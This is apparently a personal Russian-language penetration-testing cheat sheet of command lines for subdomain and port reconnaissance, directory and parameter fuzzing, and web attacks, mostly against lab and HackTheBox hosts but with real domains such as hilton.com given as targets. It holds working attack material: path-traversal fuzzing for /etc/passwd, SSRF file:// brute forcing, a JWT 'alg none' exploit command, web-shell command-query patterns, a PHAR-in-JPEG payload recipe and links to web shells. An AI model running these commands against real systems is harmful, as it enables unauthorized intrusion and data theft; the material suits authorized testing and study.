# Разведка поддоменов из свободных ресурсов
	
 ФОТОН
    https://spy-soft.net/photon-web-crawler-osint/

    - через DNS

 	dig any site.ru 
  	dig axfr site.ru @ns.server.com
    
    subfinder -d hilton.com
    
    sublist3r -d hilton.com

    assetfinder -subs-only example.com >> assetfinder_example.com 
    
 	--- Поиск доменов по ip
    https://dnsdumpster.com/

	amass enum -passive -d example.com (пассивный режим)

	amass enum -d example.com (активный режим)

# Разведка поддоменов перебором

	gobuster dns -w word.txt -d hilton.com -i (брут по днс)

# Сортировка повторов

	sort dns_names.txt | uniq

# Поиск живых поддоменов

 	httpx -status-code -tech-detect -list all_subdomains_example.com

# Поиск ссылок из адреса или домена

	xurlfind3r -d av.ru -o results

# Брут директрий и доменов

	gobuster dns -w word.txt -d hilton.com -i (брут по днс)

# Пасивный поиск портов на хосте

	https://search.censys.io/
 
# Активный поиск - конечно же nmap

 	nmap -sCV example.com
	nmap -sS -T4 -sV example.com
 
# Идентификация технологий ВЕБ

	whatweb any_subdomain.example.com

# Ищем скрытые файлы и директории

	xurlfind3r -d any_subdomains.example.com -o dirs_any_subdomains.example.com

 	ffuf -w <путь к словарю>:FUZZ -u http://any_subdomains.example.com/FUZZ 

  	gobuster dir -u http://192.168.50.13 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,html,php,css,js,sh,py,cgi,db -t 50

# Анализируем доступные фрагменты кода

	getJS --url https://example.com --verbose    ---> cnzubdftv afqks yf lbcr ----> (ищем секреты)  trufflehog filesystem path_with_source_code

# Параметры запросов

	arjun -u https://example.com/some_path/any_page.php
# Сканеры уязвимостей 

nuclei -u https://example.com -o nuclei_results_example.com

# Основной словарик каталогов

https://github.com/mxdelta/SecLists/blob/master/Discovery/Web-Content/big.txt

утилиты

wpscan --url://192.168.50.200/wordpress/ --wp-content-dir -at -eu  (все директории и все плагины для вордпресс)

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://watch.streamio.htb/ -x php

gobuster dir -u 10.129.249.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10 -x php,html,bak,txt

gobuster vhost --append-domain -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://thetoppers.htb 

ffuf -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fs 7069


---- Брут с автоматической рекурсией

	feroxbuster -u http://internal.analysis.htb -w /opt/SecList/Discovery/Web-Content/raft-small-words-lovercase.txt -x php -o output.txt

	Жмем Enter и пишем ----> c -f 3-5,8,9  (это исключит рекрсивный поиск в этих каталогах)

 
# фазинг переменных в GET запросе

wfuzz -c -u 'http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test' -w /usr/share/wfuzz/wordlist/general/big.txt

ffuf -c -r -u 'http://192.168.50.205/secret/evil.php?FUZZ=../../../../etc/passwd' -w /usr/share/SecLists/Discovery/Web-Content/common.txt -fs 0

ffuf -c -u 'http://internal.analysis.htb/users/list.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fw 2 (-fs 17 ----фильтр длинный ответа)

ffuf  -u 'http://10.10.11.173/reports.php?report=FUZZ' -w numbers.txt -fs 0 -mr 'Disclosure Information'

( -mr - искать совпадения)

# Фазинг переменных в POST запросе

ffuf -request req.txt -request-proto http -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -fs 724,727

где req.txt - захваченный POST запрос из BURPA

wfuzz -u http://11.11.11.11/centrion/api/index.php?action=autenticate -d ‘username=admin&password=FUZZ’ -w /wordlist -hc 403


# сканирование на веб дырки

nikto -url http://10.10.217.189/

# Веб-скрейпинг
	Поиск скриптов JScript на страницах
	
 	go install github.com/003random/getJS/v2@latest
	# добавление в PATH, если раньше не добавлял
	echo "export PATH=\"$HOME/go/bin:\$PATH\"" >> ~/.zshrc
	source ~/.zshrc
 
	getJS --url <URL>

# TruffleHog — автоматизируем поиск в коде
	sudo apt install trufflehog 

 	TruffleHog filesystem <название директории>

  	trufflehog git <ссылка на репозиторий> --only-verified
   

# Web Shell

https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx

# словарик для бурпа - к примеру заголовки

	https://github.com/PortSwigger/param-miner/tree/master

# Заголовки и теги

	# запрос (?) shell.php?cmd=ls
 	# обьеденение запросов (&) shell.php?cmd=ls&id=1
  	# отбросить часть запрроса (# ;) shell.php?cmd=ls#&id=1
Не забыть кодировку URL
   
 перенаправления пользователя на другой URL через указанное количество секунд
	
 	<meta http-equiv="refresh" content="0;http://127.0.0.1:8000"> 

# Смена IP при запрсе 

 	X-Forwarded-For: 1
 
# Брут файловой системы чере ssrf

	ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak,.asp,.aspx,.js,.img,.png,.jpeg -fs 1018

# JPG ---> PHAR

	PHAR в картинке сгенерил с помощью https://github.com/Sarapuce/jpeg-phar-fusion
 	А в локальном php.ini написать
	[phar]
	phar.readonly = Off
	Т.е. в файле phar_creator.py была строка "bash_command = "php phar_generator.php " + phar_payload", я её изменил на "bash_command = "php -c php.ini phar_generator.php " + phar_payload", вот что он показывает

# JWT 

  	python3 jwt_tool.py --exploit a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.PjndlgESbR_7uPWq7tKFd6o7l799Y45mU5KvDcO2nPI   (вставляем none в alg)
 # Curl

 	curl -X POST http://10.10.11.161/api/v1/user/signup -d 'user=ip'
# Forward shell  (htb timing)

	https://github.com/IppSec/forward-shell
